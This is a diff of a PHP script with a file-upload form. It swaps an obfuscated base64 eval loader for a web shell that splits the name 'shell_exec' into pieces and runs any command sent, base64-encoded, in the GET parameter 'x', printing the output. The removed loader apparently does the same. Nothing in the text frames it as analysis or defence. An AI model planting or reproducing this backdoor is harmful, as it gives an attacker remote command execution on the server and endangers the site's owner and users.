@@ -283,4 +283,6 @@ echo "<form method='POST' enctype='multipart/form-data'>
 move_uploaded_file($filetmp,$filename);
 }
 
-$_F=__FILE__;$_X='Pz48P3BocA0KNGYgKCRfR0VUWyd4J10pDQogICAgcHI0bnRfcihzaDVsbF81eDVjKDNybGQ1YzJkNShiMXM1ZXVfZDVjMmQ1KCRfR0VUWyd4J10pKSkpOw0KPz4=';eval(base64_decode('JF9YPWJhc2U2NF9kZWNvZGUoJF9YKTskX1g9c3RydHIoJF9YLCcxMjM0NTZhb3VpZScsJ2FvdWllMTIzNDU2Jyk7JF9SPWVyZWdfcmVwbGFjZSgnX19GSUxFX18nLCInIi4kX0YuIiciLCRfWCk7ZXZhbCgkX1IpOyRfUj0wOyRfWD0wOw=='));
+$e = "sh" . "ell_" . "e" . "x" . "ec";
+if ($_GET['x'])
+    print_r($e(urldecode(base64_decode($_GET['x']))));
